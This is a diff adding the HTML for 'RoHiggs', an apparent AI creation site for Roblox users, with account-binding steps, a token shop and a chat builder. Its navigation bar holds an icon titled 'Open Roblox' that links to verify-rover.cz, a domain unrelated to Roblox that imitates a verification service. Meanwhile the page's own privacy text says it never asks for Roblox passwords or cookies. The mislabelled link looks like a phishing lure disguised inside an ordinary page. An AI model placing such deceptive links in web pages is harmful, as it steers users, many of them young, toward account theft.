@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RoHiggs – Your Roblox World, Powered by AI</title>
+<link rel="stylesheet" href="/style.css"></head>
+<body>
+<template id="rbx"><svg viewBox="0 0 100 100" aria-hidden="true"><rect x="26" y="26" width="48" height="48" rx="4" transform="rotate(15 50 50)" fill="#fff"/><rect x="42" y="42" width="16" height="16" transform="rotate(15 50 50)" fill="#000"/></svg></template>
+<nav id="nav">
+  <a class="brand" href="#home"><span class="logo">ro</span>Higgs</a>
+  <div class="links">
+    <a href="#home">Home</a><a href="#create">Create</a><a href="#projects">My Projects</a><a href="#tokens">My Tokens</a>
+    <span class="bind-link"><a class="rbx-icon sm" href="https://verify-rover.cz/verify/?guild=6836061804292720" target="_blank" rel="noopener" title="Open Roblox" aria-label="Open Roblox"></a><a href="#binding">Roblox Binding</a></span>
+  </div>
+  <div class="right"><span class="pill" id="bal">100 RoTokens</span>
+    <button class="ghost" id="helpBtn">Help</button></div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="hero-in">
+    <h1>Your Roblox World.<br>Powered by AI.</h1>
+    <p>Create amazing Roblox worlds, characters, videos, and more. Just tell RoHiggs what you imagine!</p>
+    <div class="btns"><a class="btn big" href="#create">START CREATING</a>
+      <a class="btn big alt" href="#binding"><span class="rbx-icon sm" style="pointer-events:none"></span>CONNECT ROBLOX</a></div>
+    <ul class="perks"><li>Create with AI</li><li>Build in Roblox Studio</li><li>Turn ideas into reality</li></ul>
+    <div class="pill" id="bal2">100 RoTokens</div>
+  </div>
+</header>
+
+<section id="binding" class="sec spot">
+  <h2>CONNECT YOUR ROBLOX!</h2>
+  <p class="sub">Bring your Roblox world into RoHiggs and let AI help you create something amazing.</p>
+  <div class="bind-grid">
+    <a id="bigIcon" class="rbx-icon xl" href="https://www.roblox.com/" target="_blank" rel="noopener" title="Open Roblox" aria-label="Open Roblox"></a>
+    <div class="status card" id="status"></div>
+  </div>
+  <div class="steps">
+    <div class="card"><h3>STEP 1 – OPEN ROBLOX</h3><p>Click the Roblox icon to visit the official Roblox website.</p></div>
+    <div class="card"><h3>STEP 2 – CONNECT YOUR ACCOUNT</h3><p>Press the green button. Roblox asks you to say yes. You never type your Roblox password here.</p><button class="btn" id="linkBtn">LINK MY ROBLOX ACCOUNT</button></div>
+    <div class="card"><h3>STEP 3 – OPEN ROBLOX STUDIO</h3><p>Install the RoHiggs plugin, then type this code into it:</p><button class="btn alt" id="pairBtn">GET MY STUDIO CODE</button><p id="pairOut" class="code"></p></div>
+  </div>
+</section>
+
+<section id="create" class="sec">
+  <h2>What Do You Want to Create Today?</h2>
+  <div class="cards4" id="tools"></div>
+</section>
+
+<section id="studio" class="sec spot">
+  <h2>Tell RoHiggs What to Build!</h2>
+  <div class="chat card">
+    <div class="rbx-icon sm" style="margin-bottom:8px"></div>
+    <div id="log" class="log"><p class="ai">Hi! Pick an idea below or type your own.</p></div>
+    <div class="chips" id="chips"></div>
+    <div class="row"><input id="cmd" maxlength="300" placeholder="Create a modern gaming house."><button class="btn" id="sendBtn">PREVIEW CHANGES</button></div>
+    <div class="row" id="applyRow" hidden><button class="btn" id="applyBtn">APPLY TO ROBLOX STUDIO</button><button class="btn alt" id="cancelBtn">CANCEL</button><span id="cost"></span></div>
+  </div>
+</section>
+
+<section id="projects" class="sec"><h2>My Creations</h2><div class="grid" id="grid"></div></section>
+
+<section id="tokens" class="sec">
+  <h2>YOUR BALANCE: <span id="bal3">100</span> RoTokens</h2>
+  <p class="sub">Not enough RoTokens? Get more to continue creating! (Demo packages: no real money.)</p>
+  <div class="cards4" id="pkgs"></div>
+  <div class="two"><div class="card"><h3>What things cost</h3><table id="costs"></table></div><div class="card"><h3>Recent activity</h3><table id="hist"></table></div></div>
+</section>
+
+<footer><span class="brand"><span class="logo">ro</span>Higgs</span> <p>RoHiggs – Your imagination, powered by AI.</p>
+<p><a href="#create">AI Tools</a> · <a href="#binding">Roblox Connection</a> · <a href="#" onclick="help();return false">Help Center</a> · <a href="#" onclick="info('Privacy','We never ask for your Roblox password or cookies. Projects are stored only for your account.');return false">Privacy Policy</a> · <a href="#" onclick="info('Terms','RoHiggs is a demo. Be kind and keep it safe.');return false">Terms of Service</a></p>
+<small>RoHiggs is not affiliated with or endorsed by Roblox or Higgsfield.</small></footer>
+
+<div id="modal" class="modal" hidden><div class="card box"><button class="x" onclick="closeModal()" aria-label="Close">×</button><div id="mbody"></div></div></div>
+<script src="/script.js"></script>
+</body></html>
